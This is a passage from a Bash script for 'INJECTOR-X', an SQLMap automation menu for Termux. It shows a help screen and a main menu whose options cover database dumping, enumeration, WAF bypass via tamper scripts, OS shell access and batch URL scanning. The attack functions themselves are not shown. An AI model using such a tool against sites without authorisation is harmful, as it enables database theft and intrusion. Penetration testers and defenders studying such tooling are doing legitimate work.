    read -p "Press Enter..."
}

# 11. Quick Help
show_help() {
    banner
    echo -e "${BOLD}${CYAN}📖 HELP & DOCUMENTATION${NC}\n"
    
    echo -e "${BOLD}${WHITE}═══ ABOUT INJECTOR-X ═══${NC}"
    echo -e "  Advanced SQLMap automation framework for Termux"
    echo -e "  Integrates all SQLMap features with easy menu"
    
    echo -e "\n${BOLD}${WHITE}═══ KEY FEATURES ═══${NC}"
    echo -e "  ${GREEN}►${NC} Full database extraction (Quick Dump)"
    echo -e "  ${GREEN}►${NC} Complete enumeration suite"
    echo -e "  ${GREEN}►${NC} All SQLMap attack techniques"
    echo -e "  ${GREEN}►${NC} WAF bypass with 60+ tamper scripts"
    echo -e "  ${GREEN}►${NC} OS shell, file R/W, registry access"
    echo -e "  ${GREEN}►${NC} Batch scanning, custom injection"
    echo -e "  ${GREEN}►${NC} Professional HTML reports"
    echo -e "  ${GREEN}►${NC} Configuration management"
    
    echo -e "\n${BOLD}${WHITE}═══ TIPS ═══${NC}"
    echo -e "  • Use --batch for automated answers"
    echo -e "  • Higher risk/level = more thorough"
    echo -e "  • Combine tamper scripts for tough WAFs"
    echo -e "  • Check logs for detailed results"
    
    read -p "Press Enter..."
}

# ==================== MAIN MENU ====================
main_menu() {
    while true; do
        banner
        echo -e "${BOLD}${PURPLE}═══ MAIN MENU ═══${NC}\n"
        
        echo -e "${RED}${BOLD}[ ATTACKS ]${NC}"
        echo -e "  ${GREEN}[1]${NC}  ${WHITE}Quick Dump${NC}              - Full auto extraction"
        echo -e "  ${GREEN}[2]${NC}  ${WHITE}Database Enumeration${NC}    - 15+ enumeration options"
        echo -e "  ${GREEN}[3]${NC}  ${WHITE}Advanced Attacks${NC}        - 20 attack vectors"
        echo -e "  ${GREEN}[4]${NC}  ${WHITE}Batch Scanner${NC}           - Scan multiple URLs"
        echo ""
        echo -e "${BLUE}${BOLD}[ TOOLS ]${NC}"
        echo -e "  ${GREEN}[5]${NC}  ${WHITE}Tamper Script Manager${NC}  - 60+ WAF bypass scripts"
        echo -e "  ${GREEN}[6]${NC}  ${WHITE}Report Generator${NC}       - Professional HTML reports"
        echo -e "  ${GREEN}[7]${NC}  ${WHITE}Analytics Dashboard${NC}    - Statistics & history"
        echo -e "  ${GREEN}[8]${NC}  ${WHITE}Config Manager${NC}         - Save/load configs"
        echo -e "  ${GREEN}[9]${NC}  ${WHITE}Data Browser${NC}           - View extracted data"
        echo ""
        echo -e "${PURPLE}${BOLD}[ SYSTEM ]${NC}"
        echo -e "  ${GREEN}[U]${NC}  ${WHITE}Update Framework${NC}       - Update SQLMap & deps"
        echo -e "  ${GREEN}[H]${NC}  ${WHITE}Help & Info${NC}            - Documentation"
        echo -e "  ${GREEN}[C]${NC}  ${WHITE}Clear Cache${NC}            - Free up space"
        echo -e "  ${GREEN}[0]${NC}  ${RED}Exit${NC}"
        
        echo -ne "\n  ${GREEN}[?]${NC} ${BOLD}Select: ${NC}"
        read choice
        
        case $choice in
            1) quick_dump ;;
            2) database_enum ;;
            3) advanced_attacks ;;
            4) batch_scan ;;
            5) tamper_manager ;;
            6) gen_report ;;
            7) analytics ;;
            8) config_manager ;;
            9) data_browser ;;
            [Uu]) update_framework ;;
            [Hh]) show_help ;;
            [Cc]) rm -rf "$CACHE_DIR"/* 2>/dev/null; echo -e "${GREEN}[✓] Cache cleared${NC}"; sleep 1 ;;
            0) 
                clear
                echo -e "${PURPLE}"
                echo '  INJECTOR-X Framework Deactivated '
                echo '   Stay Ethical. Stay Legal.       '

                echo -e "${NC}"
                sleep 2
                exit 0
                ;;
            *) echo -e "${RED}[!] Invalid option${NC}"; sleep 1 ;;
        esac
    done
}

# Trap Ctrl+C
trap 'echo -e "\n${RED}[!] Interrupted${NC}"; sleep 1; exit 1' INT TERM

# ==================== START ====================
init
main_menu